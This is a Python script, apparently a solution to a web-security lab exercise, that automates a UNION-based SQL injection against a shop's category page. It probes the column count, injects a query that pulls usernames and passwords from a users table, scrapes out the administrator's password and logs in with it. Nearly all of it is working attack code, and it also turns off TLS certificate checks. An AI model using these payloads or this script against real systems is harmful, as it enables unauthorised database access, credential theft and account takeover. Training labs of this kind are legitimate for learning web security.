import sys
import logging
import urllib3
import requests
import re
import utils
from shop import Shop

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}] [{name}] {message}",
    style="{", 
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def determine_number_of_columns(url, no_proxy):
    log.info("Determining number of columns")
    nulls_list=["NULL"]
    num_columns = None
    while len(nulls_list) < 10:
        nulls = ",".join(nulls_list)
        category = f"' UNION SELECT {nulls}-- "
        exploit_url = url + category
        if no_proxy: 
            resp = requests.get(exploit_url)
        else: 
            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
        if resp.status_code == 200:
            num_columns = len(nulls_list)
            break
        nulls_list.append("NULL")
    if num_columns:
        log.info(f"number of columns if: {num_columns}")
    return num_columns


def determine_text_columns(url, no_proxy, num_columns):
    text_columns = []
    for i in range(0, num_columns):
        nulls_list = ["NULL"] * num_columns
        nulls_list[i] = "'a'"
        nulls = ",".join(nulls_list)
        category = f"' UNION SELECT {nulls}-- "
        exploit_url = url + category 
        if no_proxy: 
            resp = requests.get(exploit_url)
        else: 
            resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
        if resp.status_code == 200:
            text_columns.append(i)
    if text_columns:
        text_columns_str = ", ".join(map(str, text_columns))
        log.info(f"The text columns are: {text_columns_str}")
    return text_columns



def main(args):
    session = requests.Session()
    shop = Shop(args.url, args.no_proxy, session)
    num_columns = determine_number_of_columns(shop.category_url, shop.no_proxy)
    if not num_columns:
        log.error("Couldn't determine number of columns. Exiting")
        sys.exit(-1)
        determine_text_columns(shop.category_url, shop.no_proxy, num_columns)
    category = "' UNION SELECT username,password from users-- "
    exploit_url = shop.category_url + category
    if args.no_proxy:
        resp = requests.get(exploit_url)
    else:
        resp = requests.get(exploit_url, proxies=utils.PROXIES, verify=False)
    pattern = r"<th>administrator</th>.*?<td>(.*?)</td>"
    m = re.search(pattern, resp.text, flags=re.M | re.DOTALL)
    password = m[1]
    shop.login("administrator", password)
    shop.is_solved()
    
    
if __name__ == "__main__":
    args=utils.parse_args(sys.argv)
    main(args)
